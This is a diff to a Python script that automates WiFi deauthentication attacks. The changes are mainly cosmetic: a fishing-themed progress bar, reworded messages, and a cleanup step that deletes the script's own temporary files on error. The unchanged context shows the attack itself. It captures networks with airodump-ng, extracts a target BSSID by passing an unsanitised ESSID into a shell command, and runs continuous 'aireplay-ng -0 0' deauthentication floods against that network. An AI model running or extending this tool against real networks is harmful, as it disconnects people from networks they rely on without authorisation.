@@ -1,4 +1,4 @@
-import subprocess, time, sys, argparse
+import subprocess, time, sys, argparse, threading
 
 
 
@@ -11,6 +11,38 @@ import subprocess, time, sys, argparse
 red = "\033[1;31m"
 
 green = "\033[1;32m"
+
+yellow = "\033[1;33m"
+
+blue = "\033[1;34m"
+
+
+
+
+
+
+
+
+
+def downLine( t = 12 ):
+
+    sTime = time.time()
+
+    length = 30
+
+    while time.time() - sTime <= t:
+
+        eTime = time.time() - sTime
+
+        p = eTime / t
+
+        line = f"\r{ green }Program is fishing 🎣: { '-' * int( length * p ):{ length }s} { int( p * 101 ) }%"
+
+        sys.stdout.write( line )
+
+        sys.stdout.flush()
+
+        time.sleep( 0.1 )
 
 
 
@@ -26,11 +58,13 @@ def iwCh( channel, interface ):
 
         subprocess.run( f"sudo iwconfig { interface } channel { channel }", shell = True, check = True )
 
-        print( f"\n\n{ green }Channel is set to { channel } on { interface }!\n\n" )
+        print( f"{ green }Channel is set to { channel } on { interface } ✔\n\n" )
 
     except:
 
-        print( f"\n{ red }Getting error in setting channel on { interface }!" )
+        print( f"\n\n{ red }Getting error in setting channel on { interface }!\nLet him fish again!\n\n" )
+
+        subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt", shell = True, check = True )
 
         sys.exit( 0 )
 
@@ -46,7 +80,7 @@ def kiddDeAuth( BSSID, interface ):
 
     try:
 
-        print( f"\n\n{ red }I am going to kid the wifi right now!\n\n" )
+        print( f"\n\n{ red }Program is roasting the fish!\n\n" )
 
         p = subprocess.Popen( [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ] )
 
@@ -56,7 +90,7 @@ def kiddDeAuth( BSSID, interface ):
 
         p.wait()
 
-        print( f"\n\n{ green }I am going to sleep for a while!\n\n" )
+        print( f"\n\n{ green }Taking a nap 💤\n\n" )
 
         time.sleep( 60 )
 
@@ -94,15 +128,15 @@ def air( IF, ESSID ):
 
     p = subprocess.Popen( ["sudo", "airodump-ng", "-i", IF ], stdout= f )
 
-    print( f"\n\n{ green }Capture file is being created! Please wait!\n\n" )
+    print( "\n\n" )
 
-    time.sleep( 10 )
+    downLine()
 
     p.terminate()
 
     p.wait()
 
-    print( f"\n\n{ green }Capture file has been created!\n\n" )
+    print( f"\n\n\n{ green }Program got fishbox ✔\n\n" )
 
     subprocess.run( "grep -i '%s' wifiInterF.txt | head -n 1 | awk '{ print $2 }' > wifiBssid.py" % ESSID, shell = True, check = True )
 
